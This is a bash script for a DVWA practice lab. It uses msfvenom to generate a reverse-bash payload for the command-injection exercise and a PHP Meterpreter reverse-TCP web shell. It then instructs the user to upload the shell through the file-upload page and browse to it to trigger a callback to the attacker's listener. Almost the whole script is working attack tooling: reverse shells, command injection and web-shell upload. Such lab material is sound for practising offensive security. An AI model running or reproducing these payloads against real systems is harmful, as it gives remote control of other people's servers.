#!/usr/bin/env bash
# Generate the two lab payloads with msfvenom, driven by lab.env.
set -euo pipefail
cd "$(dirname "$0")/.."
if [ -f lab.env ]; then source lab.env; else echo "Create lab.env from lab.env.example first."; exit 1; fi
mkdir -p out

echo "[*] Phase 2 — cmd/unix/reverse_bash. Paste the line below after '127.0.0.1; ' in the Command Injection box:"
echo "----------------------------------------------------------------------"
msfvenom -p cmd/unix/reverse_bash LHOST="$LHOST" LPORT="$LPORT_CMD" -f raw | tee out/revbash.txt
echo
echo "----------------------------------------------------------------------"
echo "[*] Phase 3 — php/meterpreter_reverse_tcp -> out/shell.php"
msfvenom -p php/meterpreter_reverse_tcp LHOST="$LHOST" LPORT="$LPORT_PHP" -f raw -o out/shell.php

# Guarantee a leading PHP open tag so the server executes it.
if ! head -c 5 out/shell.php | grep -q '<?php'; then
  printf '<?php ' | cat - out/shell.php > out/shell.php.tmp && mv out/shell.php.tmp out/shell.php
  echo "[*] Prepended <?php to out/shell.php"
fi

echo "[*] Upload out/shell.php via DVWA File Upload, then visit"
echo "    http://$RHOST:$RPORT/hackable/uploads/shell.php to trigger it (start the handler first)."
